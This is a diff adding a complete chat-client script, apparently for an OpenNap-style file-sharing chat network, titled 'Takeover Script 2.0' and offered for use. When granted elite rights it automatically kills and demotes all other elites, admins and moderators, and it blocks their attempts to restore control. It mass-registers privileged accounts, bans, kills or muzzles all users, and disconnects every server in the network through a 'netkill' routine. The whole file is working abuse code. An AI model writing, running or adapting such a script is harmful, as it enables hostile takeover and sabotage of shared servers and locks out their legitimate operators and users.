@@ -1,0 +1,148 @@
+/*
+Takeover Script 2.0
+by Joey2cool(thanks to gircobain and dot_com for helping me clean it up)
+http://2cool.rapigator.com
+
+this script automatically activates if you are elited by a server or by
+another elite. you can also takeover manually by pressing /takeover it sets
+all mod+(starting with elites, then admins, then mods) and keeps it that
+way. it also disconnects servers trying to connect automatically
+
+commands :
+/takeover - manual takeover(use if you are already connected.)
+/banallnick - bans all nicks
+/banallip - bans all IPs
+/killall - kills all users
+/leechall - leeches all users
+/muzzleall - muzzles all users
+/regelite # - registers a specified number of Elite accounts
+/regadmin # - registers a specified number of Admin accounts
+/regmod # - registers a specified number of Moderator accounts
+/netkill - kills all servers in a network but the one you are on
+*/
+assign save_path ./passwords.txt
+assign protected_nicks joey2cool joey2 rapigator funk
+
+
+@chars = [0123456789abcdefghijklmnopqrstuvwxyz\[\]\(\)_^]
+if (!match($N $protected_nicks)) @protected_nicks = protected_nicks ## [ $N]
+
+### START OF VISUAL CRAP ###
+set status_format1 00,4436[57%T36][37%h%N36]%A%D [%C:%c%+%W36]  %Q %H%B%F%G[%L] ,51Takeover Mode00,44
+xecho -b 51Loaded Joey2cool's Takeover Script 2.0
+on -input "/dump" {
+set status_Format1 00,4436[57%T36][37%h%N36]%A%D [%C:%c%+%W36]  %Q %H%B%F%G[%L]
+xecho -b 51Unloaded Joey2cool's Takeover Script 2.0
+}
+### END OF VISUAL CRAP ###
+
+### START OF TAKEOVER SECTION ###
+^on -404 "Server % set your user level to Elite*" takeover
+^on -404 "Server % changed your user level to Elite*" takeover
+^on -404 "% changed your user level to Elite*" takeover
+alias takeover {
+if (!match($N $protected_nicks)) @protected_nicks = protected_nicks ## [ $N]
+gusers -elite -cmd { if (!match($0 $protected_nicks)) {
+kill $0 Takeover
+raw 606 $0 user
+}
+}
+gusers -admin -cmd { if (!match($0 $protected_nicks)) {
+kill $0 Takeover
+raw 606 $0 user
+}
+}
+gusers -mod -cmd { if (!match($0 $protected_nicks)) {
+kill $0 Takeover
+raw 606 $0 user
+}
+}
+xecho -b 51Took over $S
+}
+### END OF TAKEOVER SECTION ###
+
+### START OF PROTECTION SECTION ###
+^on -404 "Server % % % user level to *" {
+if ($7 != [leech]) if (!match($before(' $3) $protected_nicks)) raw 606 $before(' $3) user
+if ($7 == [leech]) if (match($before(' $3) $protected_nicks)) raw 606 $before(' $3) elite
+}
+^on -404 "% changed % user level to *" if (!match($0 $protected_nicks)) {
+if (!match($before(' $2) $protected_nicks)) raw 606 $before(' $2) user
+if (match($before(' $2) $protected_nicks)) raw 606 $before(' $2) elite
+raw 606 $0 user
+}
+^on -404 "% registered nickname *" if (!match($0 $protected_nicks)) {
+raw 611 $3
+raw 606 $0 user
+}
+^on -404 "% registered nickname *" if (!match($0 $protected_nicks)) {
+raw 611 $3
+raw 606 $0 user
+}
+^on -404 "% banned *" if (!match($0 $protected_nicks)) {
+raw 614 $before(: $2)
+raw 606 $0 user
+}
+^on -404 "Server % banned *" raw 614 $before(: $3)
+^on -404 "Server % has joined" raw 10101 $1
+### END OF PROTECTION SECTION ###
+
+### START OF EXTRA COMMANDS SECTION ###
+alias regelite { reg $0 elite }
+alias regadmin { reg $0 admin }
+alias regmod { reg $0 mod }
+alias reg {
+repeat $0 {
+@srand($time())
+@:password = []
+@:nick = []
+repeat 15 @nick = nick ## mid($rand(${@chars-1}) 1 $chars)
+repeat 15 @password = password ## mid($rand(${@chars-1}) 1 $chars)
+@:connectstring = nick ## [:] ## password ## [ $1]
+raw 10200 $nick $password a $1
+@:fd = open($save_path w)
+@write($fd $connectstring)
+@close($fd)
+}
+}
+alias banallip gusers -cmd { if (!match($0 $protected_nicks)) ban $1 }
+alias banallnick gusers -cmd { if (!match($0 $protected_nicks)) ban $0 }
+alias killall gusers -cmd { if (!match($0 $protected_nicks)) kill $0 }
+alias leechall gusers -cmd { if (!match($0 $protected_nicks)) raw 606 $0 leech }
+alias muzzleall gusers -cmd { if (!match($0 $protected_nicks)) muzzle $0 }
+### END OF EXTRA COMMANDS SECTION ###
+
+### START OF NETKILL SECTION ###
+alias netkill {
+raw 10112
+^on ^10112 "*" {
+if ([$*] != []) {
+@setitem(servernames $numitems(servernames) $2) 
+@setitem(hops $numitems(hops) $4)
+}
+if ([$*] == []) {
+xecho -b 51Killing the Network!!!
+^local n1, n2, hopped
+for (@n1 = numwords($numsort($listarray(hops)))-1, n1>=0, @n1--) {
+@:flag = 0
+for (@n2 = 0, n2<numitems(servernames), @n2++) {
+if ((getitem(hops $n2) == word($n1 $numsort($listarray(hops)))) && (match($n2 $hopped)<1) && (!flag)) {
+raw 10110 $getitem(servernames $n2) "NetKilled!"
+push hopped $n2
+@:flag = 1
+}
+}
+}
+}
+}
+}
+### END OF NETKILL SECTION ###
+
+### START OF IGNORED NUMERICS SECTION ###
+^on ^751 "*"
+^on ^752 "*"
+^on ^205 "*"
+^on ^641 "*"
+^on ^640 "*"
+^on ^831 "*"
+### END OF IGNORED NUMERICS SECTION ###
